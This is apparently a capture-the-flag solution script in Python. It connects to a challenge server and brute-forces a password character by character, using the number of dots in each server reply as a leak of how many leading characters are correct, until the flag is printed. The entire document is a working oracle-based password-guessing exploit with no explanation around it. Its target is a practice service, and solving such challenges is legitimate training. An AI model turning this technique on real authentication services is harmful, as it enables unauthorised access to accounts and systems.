import socket

HOST = "cyberchallenges.uk"
PORT = 8095

charlist = '_abcdefghijklmnopqrstuvwxyz'
password = ''
solved = False

def try_password(password):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        _ = s.recv(1024)
        _ = s.recv(1024)
        s.sendall(str.encode(password))
        data = s.recv(1024).decode("utf-8").strip()
        if 'flag' in data:
            print(data)
            return 999
        if data == '.':
            s.close()
            return 99
        #if 'Wrong' not in str(data):
        #    something = s.recv(1024)
        #    print(something)
        return str(data).count('.')

while not solved:
    for char in charlist:
        attempt = password + char
        print(attempt)
        result = try_password(attempt)
        if result == 999:
            solved = True
            break
        if result > len(password):
            password = attempt
            print(password)
            break
        password = password[:result]

